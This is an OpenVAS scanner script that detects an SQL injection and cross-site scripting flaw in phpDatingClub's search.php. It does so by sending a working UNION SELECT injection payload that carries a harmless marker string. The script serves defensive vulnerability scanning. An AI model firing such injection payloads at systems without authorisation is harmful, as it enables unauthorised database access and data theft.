###############################################################################
# OpenVAS Vulnerability Test
# $Id: phpDatingClub_35454.nasl 5016 2017-01-17 09:06:21Z teissa $
#
# phpDatingClub 'search.php' Cross-Site Scripting and SQL Injection
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "phpDatingClub is prone to a cross-site scripting vulnerability and
  an SQL-injection vulnerability because the application fails to
  sufficiently sanitize user-supplied input.

  Exploiting these issues could allow an attacker to steal
  cookie-based authentication credentials, compromise the application,
  access or modify data, or exploit latent vulnerabilities in the
  underlying database.

  phpDatingClub 3.7 is vulnerable; other versions may also be
  affected.";


if (description)
{
 script_id(100231);
 script_version("$Revision: 5016 $");
 script_tag(name:"last_modification", value:"$Date: 2017-01-17 10:06:21 +0100 (Tue, 17 Jan 2017) $");
 script_tag(name:"creation_date", value:"2009-07-08 19:01:22 +0200 (Wed, 08 Jul 2009)");
 script_bugtraq_id(35454);
 script_cve_id("CVE-2009-2179","CVE-2009-2178");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("phpDatingClub 'search.php' Cross-Site Scripting and SQL Injection Vulnerabilities");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/35454");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dir = make_list("/phpDatingClub",cgi_dirs());
foreach d (dir)
{ 

 url = string(d,"/index.php");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( buf == NULL )continue;

 if( egrep(pattern: "Powered by <a [^>]+>phpDatingClub", string: buf, icase:TRUE)  ) {

  url1 = string(d, "/search.php?mode=day&sform[day]=-1+union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--");
  req1 = http_get(item:url1, port:port);
  buf1 = http_keepalive_send_recv(port:port, data:req1, bodyonly:1);
  if( buf == NULL )continue;

  if( egrep(pattern: "OpenVAS-SQL-Injection-Test", string: buf1, icase:TRUE)  )
    {    
     security_message(port:port);
     exit(0);
    }
 }
}
exit(0);
